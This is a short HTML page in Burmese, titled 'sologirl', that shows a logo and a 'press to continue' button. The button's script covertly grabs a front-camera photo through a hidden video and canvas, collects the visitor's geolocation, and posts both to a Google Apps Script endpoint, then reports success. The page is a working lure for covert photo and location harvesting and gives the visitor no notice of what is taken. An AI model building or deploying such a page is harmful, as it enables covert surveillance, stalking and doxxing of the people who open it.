<!DOCTYPE html>
<html lang="my">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>sologirl</title>
    <style>
        .logo-container img {
            width: 150px;
            height: auto;
            margin-bottom: 20px;
        }
        body {
            font-family: sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f4f4f9;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background-color: #FFD700;
            color: #333;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
        button:hover {
            background-color: #e5c100;
        }
        #status {
            margin-top: 20px;
            font-size: 16px;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="logo-container">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTIdsZ8DVwfk1aVnNnmO4aQ4WzivjTk1FLaNmOl8wlqWg&s=10" alt="Logo">
    </div>
    
    <h2>ဆက်သွားရန် ခလုတ်ကိုနှိပ်ပါ</h2>
    
    <button onclick="captureAndSend()">နှိပ်ပါ</button>
    <p id="status"></p>

    <!-- ကင်မရာအတွက် Hidden Video နဲ့ Canvas -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const scriptURL = " https://script.google.com/macros/s/AKfycbzouwtrAraMo8xPu_fFrYkXSp9lXuVDH8ESDneAs7YEOyMrN2OgJGSZteYgdGTiQS3GFw/exec"; // ကိုယ့်ရဲ့ Apps Script URL ထည့်ရန်


        // Location ရယူရန် Promise လုပ်ဆောင်ခြင်း
        function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error("Geolocation is not supported by your browser"));
                } else {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                lat: position.coords.latitude,
                                lon: position.coords.longitude
                            });
                        },
                        (error) => {
                            reject(error);
                        }
                    );
                }
            });
        }

        async function captureAndSend() {
            const statusText = document.getElementById("status");
            statusText.innerText = "လုပ်ဆောင်နေပါသည်... ခဏစောင့်ပါ။";

            try {
                // ၁။ ကင်မရာခွင့်ပြုချက်တောင်းပြီး ပုံရိုက်ယူရန်
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById("video");
                video.srcObject = stream;

                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        resolve();
                    };
                });

                const canvas = document.getElementById("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext("2d");
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const imageData = canvas.toDataURL("image/jpeg");

                // ကင်မရာပိတ်မည်
                stream.getTracks().forEach(track => track.stop());

                // ၂။ Location ပါ တခါတည်း လှမ်းတောင်းမည်
                let locationData = { lat: null, lon: null };
                try {
                    locationData = await getLocation();
                } catch (locErr) {
                    console.log("Location permission denied or unavailable:", locErr);
                }

                // ၃။ Google Apps Script သို့ ပုံနှင့် Location ပို့မည်
                const payload = {
                    image: imageData,
                    latitude: locationData.lat,
                    longitude: locationData.lon
                };

                await fetch(scriptURL, {
                    method: "POST",
                    mode: "no-cors",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

                statusText.innerText = "အောင်မြင်ပါသည်။";

            } catch (err) {
                statusText.innerText = "ခွင့်ပြုချက် ပိတ်ထား သို့မဟုတ် အမှားအယွင်းရှိသည်။";
            }
        }
    </script>
</body>
</html>
